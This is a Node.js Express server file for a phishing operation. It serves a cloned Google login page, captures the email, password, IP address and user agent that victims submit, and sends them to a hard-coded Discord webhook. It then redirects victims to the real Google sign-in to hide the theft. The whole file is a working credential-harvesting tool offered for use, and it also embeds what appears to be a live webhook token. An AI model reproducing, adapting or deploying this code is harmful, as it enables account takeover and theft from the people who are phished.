const express = require('express');
const path = require('path');
const { fetch } = require('undici');

const app = express();

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// CONFIGURATION
// REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1562347397328408668/77sTEQZglTHZUB-iP_oU1nkqftlqKVqpIKxkAirPQ5tNAPd-u-uSDNCapWpAAfgyBp7D';

/**
 * Sends a notification to Discord.
 */
async function sendToDiscord(title, fields, color = 0x00ff00) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
    console.log('[DISCORD] Webhook not configured. Skipping alert.');
    return;
  }

  const payload = {
    content: `**🚨 ${title}**`,
    embeds: [{
      title: title,
      fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false })),
      color: color,
      timestamp: new Date().toISOString()
    }]
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!response.ok) {
      console.error(`[DISCORD] Webhook failed with status: ${response.status}`);
    }
  } catch (err) {
    console.error('[DISCORD] Webhook error:', err.message);
  }
}

// 1. SERVE THE CLONE
app.get('/', (req, res) => {
  console.log('[CLONE] Login page served.');
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 2. CATCH THE CREDENTIALS
app.post('/login', async (req, res) => {
  const email = req.body.email || 'unknown';
  const password = req.body.passwd || 'unknown';
  
  console.log(`[CREDENTIALS] Captured: ${email} : ${password}`);

  // Send to Discord
  await sendToDiscord('Credential Capture', [
    { name: 'Email', value: email, inline: true },
    { name: 'Password', value: password, inline: true },
    { name: 'IP', value: req.headers['x-forwarded-for'] || req.socket.remoteAddress, inline: false },
    { name: 'User-Agent', value: req.headers['user-agent'] || 'Unknown', inline: false }
  ], 0x00ff00);

  // 3. REDIRECT TO REAL GOOGLE
  res.redirect('https://accounts.google.com/service/lp/challenge?hl=en&flowName=GlifWebSignIn&flowEntry=AccountPicker');
});

const server = app.listen(3000, () => {
  console.log('Google Clone running on http://localhost:3000');
});
